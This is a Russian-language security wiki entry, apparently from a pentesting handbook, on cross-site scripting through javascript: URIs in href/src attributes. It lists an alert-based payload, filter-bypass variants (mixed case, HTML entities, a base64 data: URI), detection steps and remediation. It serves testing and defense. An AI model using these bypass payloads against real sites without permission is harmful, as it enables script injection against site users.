---
id: xss-href-javascript-scheme
title: "XSS: схема javascript: в href/src"
type: xss
target: html
category: web
difficulty: intermediate
bypass: filter
tags: [xss, uri-scheme, filter-bypass]
tested_on: ["Chrome 120", "Firefox 121"]
success_rate: 0.6
risk: medium
cwe: "CWE-79"
lab: null
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-community/attacks/xss/"
  - "https://portswigger.net/web-security/cross-site-scripting"
graph:
  - target: "xss"
    type: instance_of
---

# XSS: схема javascript: в href/src

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
javascript:alert(document.domain)//
```

## Explanation

Если значение параметра подставляется в `href`/`src` без проверки схемы, переход по ссылке
исполняет JavaScript. Фильтры часто ищут подстроку `javascript:`, поэтому применяются
обходы: регистр, HTML-сущности, пробелы/переносы. `//` в конце — комментарий,
скрывающий добавленный приложением хвост URL.

## Detection

Проверьте, куда отражается значение: `<a href="USER">`. Отправьте `javascript:1`
и посмотрите, сохранилась ли схема в ответе.

## Remediation

- Whitlist схем: только `http`, `https`, `mailto`, относительные URL.
- Никогда не подставлять пользовательские данные в `href` без валидации URL.
- CSP не блокирует `javascript:` в `href` — нужна валидация на сервере.

## Variants

```
JaVaScRiPt:alert(1)
```

```
java&#09;script:alert(1)
```

```
&#106;avascript:alert(1)
```

```
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```
